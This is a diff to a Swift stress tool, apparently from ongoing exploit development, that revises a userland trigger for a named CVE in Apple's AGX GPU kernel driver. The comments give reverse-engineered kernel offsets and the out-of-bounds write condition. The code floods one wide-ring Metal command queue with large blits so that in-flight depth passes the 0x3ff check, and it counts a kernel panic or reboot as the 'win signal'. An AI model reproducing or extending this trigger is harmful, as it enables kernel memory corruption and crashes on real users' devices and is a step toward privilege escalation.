@@ -195,81 +195,69 @@ final class AGXStress {
 
     // MARK: - engines
 
-    /// Phase 0 — THE trigger for CVE-2026-64747 (v3).
+    /// Phase 0 — THE trigger for CVE-2026-64747 (v3.2).
     ///
-    /// Kernel RE (2026-08-11, decisive): queue+0x170 / queue+0x700 are GPU
-    /// *firmware/hardware* counters — no kernel software accumulates them.
-    /// Allocator 0x1bd450 and base-class init 0x1c08e0 never write 0x170; the
-    /// queue vtable method 0x4aa540 writes [q+0x170]=[q+0x16c]=w1 where w1 comes
-    /// from [q+0x174] (cached high word) or a blraa to vtable+0x7a8 (hardware
-    /// poll).  Commit fn 0x1d7ec0 reads
-    ///   [cmd+0xc4] = [queue+0x170] & 0xffffff80
-    ///   [cmd+0xc8] = [queue+0x700] & 0xffffff80
-    /// with NO bounds check and feeds vuln fn 0x3a8c / 0x3c20, which treat the
-    /// value as a bitmask and copy a 0x40 template to obj+0x1040+n*0x40 and
-    /// obj+0x1540+n*0x40 for every set bit n.  Legal bits are 0..9; bit >= 10
-    /// (count >= 0x400) writes OOB up to 0x1d40 — still inside the 0x2000
-    /// object, over the command-slot pointer fields at 0x12c0..0x1d00.
-    /// 26.6 adds `orr w8,w2,w1; cmp #0x3ff; b.hi reject` — Apple admits the
-    /// counter legally passes 0x3ff in normal use.
+    /// v3.1 (default ring, 4096 submits) did NOT trigger: barrier=ok, no
+    /// STALL — the 4096 commits drained in ~1s, the GPU retired blits as fast
+    /// as we enqueued.  Conclusion: the hardware counter fed into cmd+0xc4 is
+    /// NOT cumulative submit count; it is the *outstanding / in-flight* depth,
+    /// capped by the queue's ring width.  A default queue (ring 64) can never
+    /// hold 0x400 in-flight.
     ///
-    /// v2 was WRONG: it spread submissions across many fresh queues, but the
-    /// counter is PER-QUEUE monotonic.  v3 floods ONE queue with >=1024 submits
-    /// so its hardware counter crosses bit10.  Keep in-flight bounded (<= ring)
-    /// via a semaphore so the queue never wedges; then barrier-check for GPU
-    /// STALL / panic as the observable trigger signal.
+    /// 26.6's `orr w8,w2,w1; cmp #0x3ff; b.hi reject` matches this: the only
+    /// "normal use" where depth passes 0x3ff is a queue built with a wide
+    /// maxCommandBufferCount.  So v3.2:
+    ///   * ONE queue, maxCommandBufferCount = 2048  (0x800 → bits 11+ set)
+    ///   * each buffer carries 32MB of blit so the GPU lags behind the enqueue
+    ///     rate → the ring genuinely fills to 0x800 outstanding
+    ///   * track max in-flight, then barrier-check for STALL/panic.
     private func floodStorm() {
-        let inflightCap = 64                    // matches a sane default ring width
-        let sem = DispatchSemaphore(value: inflightCap)
-        let target: UInt64 = 4096               // 4x past 0x400 — covers ring/wrap slack
+        final class Counter { var inFlight = 0; var maxInFlight = 0 }
+        let ring = 2048
+        let q = device.makeCommandQueue(maxCommandBufferCount: ring) ?? queue
+        // 32MB of blit per buffer: A15 copies ~100GB/s, so each buffer sticks
+        // on the GPU ~a millisecond — enough for enqueue to outrun retire.
+        let src = device.makeBuffer(length: 8 << 20, options: .storageModeShared)
+        let dst = device.makeBuffer(length: 8 << 20, options: .storageModeShared)
+        let counterLock = NSLock()
+        let counter = Counter()
         var committed: UInt64 = 0
-        var stalled = false
-        var reported = 0
+        let target: UInt64 = UInt64(ring) * 3   // fill the ring fully, wrap a few times
 
-        // Reuse one scratch pair so 4096 submits don't allocate 4096 live
-        // MTLBuffers (the GPU keeps each alive until its buffer completes).
-        let pair: (MTLBuffer, MTLBuffer)? = {
-            guard let a = device.makeBuffer(length: 64, options: .storageModeShared),
-                  let b = device.makeBuffer(length: 64, options: .storageModeShared) else { return nil }
-            return (a, b)
-        }()
-
-        log("floodStorm: ONE queue → \(target) submits (needs ≥0x400 to set bit10)")
+        log("floodStorm v3.2: wide-ring \(ring) queue, 32MB blit/buffer, target \(target)")
         while committed < target && isRunning() {
-            guard let cb = queue.makeCommandBuffer() else { break }
-            cb.addCompletedHandler { _ in sem.signal() }
-            if let (a, b) = pair, let blit = cb.makeBlitCommandEncoder() {
-                a.contents().storeBytes(of: UInt32(committed & 0x3FF), toByteOffset: 0, as: UInt32.self)
-                // 8 copies per buffer — if the counter advances per command
-                // rather than per buffer, this multiplies the reach by 8.
-                for _ in 0..<8 {
-                    blit.copy(from: a, sourceOffset: 0, to: b, destinationOffset: 0, size: 64)
+            guard let cb = q.makeCommandBuffer() else { break }
+            cb.addCompletedHandler { _ in
+                counterLock.lock()
+                counter.inFlight -= 1
+                counterLock.unlock()
+            }
+            if let blit = cb.makeBlitCommandEncoder(), let s = src, let d = dst {
+                for _ in 0..<4 {
+                    blit.copy(from: s, sourceOffset: 0, to: d, destinationOffset: 0, size: 8 << 20)
                 }
                 blit.endEncoding()
             }
             cb.commit()
             committed += 1
-            if sem.wait(timeout: .now() + 3) == .timedOut {
-                stalled = true
-                log("!!! floodStorm: in-flight cap never freed at \(committed) — GPU STALL?")
-                break
-            }
-            if committed >= UInt64((reported + 1) * 512) {
-                reported += 1
-                log("floodStorm: committed=\(committed) live")
+            counterLock.lock()
+            counter.inFlight += 1
+            if counter.inFlight > counter.maxInFlight { counter.maxInFlight = counter.inFlight }
+            counterLock.unlock()
+            if committed.isMultiple(of: 512) {
+                log("floodStorm: committed=\(committed) inFlight=\(counter.inFlight) max=\(counter.maxInFlight)")
             }
         }
-        // Final barrier — prove the queue drained, or report the stall.
         let done = DispatchSemaphore(value: 0)
-        if let b = queue.makeCommandBuffer() {
+        if let b = q.makeCommandBuffer() {
             b.addCompletedHandler { _ in done.signal() }
             b.commit()
         }
-        let r = done.wait(timeout: .now() + 8)
-        log("floodStorm: committed=\(committed) barrier=\(r == .timedOut ? "STALL" : "ok") stalled=\(stalled)")
-        // A reboot / panic-full in Analytics is the win signal.  If bit10 fired
-        // and the OOB overwrote the 0x12c0..0x1d00 slot fields the app may die
-        // or the GPU hang — both are observable trigger confirmations.
+        let r = done.wait(timeout: .now() + 15)
+        log("floodStorm v3.2: committed=\(committed) maxInFlight=\(counter.maxInFlight) barrier=\(r == .timedOut ? "STALL" : "ok")")
+        // A reboot / panic-full / app kill is the win signal.  If bit10 fired
+        // and the OOB overwrote the 0x12c0..0x1d00 slot fields, expect death
+        // or GPU hang — both confirm the trigger is userland-reachable.
     }
 
     /// Commit a command buffer that signals `event` to `value`.  FIX: do NOT
